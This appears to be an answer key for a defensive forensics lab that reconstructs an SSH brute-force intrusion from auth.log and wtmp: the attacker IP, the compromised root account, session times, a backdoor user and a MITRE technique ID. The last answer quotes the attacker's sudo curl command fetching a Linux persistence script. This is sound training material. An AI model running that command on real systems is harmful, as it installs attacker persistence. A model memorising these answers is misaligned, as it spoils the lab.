# BRUTUS

### Task 1 
Analyze the auth.log.
What is the IP address used by the attacker to carry out a brute force attack?
> 65.2.161.68

### Task 2
The brute-force attempts were successful and an attacker gained access to an account on the server. \
What is the username of the account?
> root

### Task 3
Identify the timestamp when the attacker logged in manually to the server to carry out their objectives.
The login time will be different than the authentication time, and can be found in the wtmp artifcat.
> 2024-03-06 06:32:45

### Task 4
SSH login sessions are tracked and assigned a session number upon login. 
What is the session number assigned to the attacker's session for the user account from Question 2?
> 37

### Task 5
The attacker added a new user as part of their persistence strategy on the server and gave this user account higher privileges. 
What is the name of this account?
> cyberjunkie

### Task 6
What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
>T1136.001

### Task 7
What time did the attacker's first SSH session end according to auth.log?
> 2024-03-06 06:37:24

### Task 8
The attacker logged into their backdoor account and utilized their higher privileges to download a script.
What is the full command executed using sudo?
>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

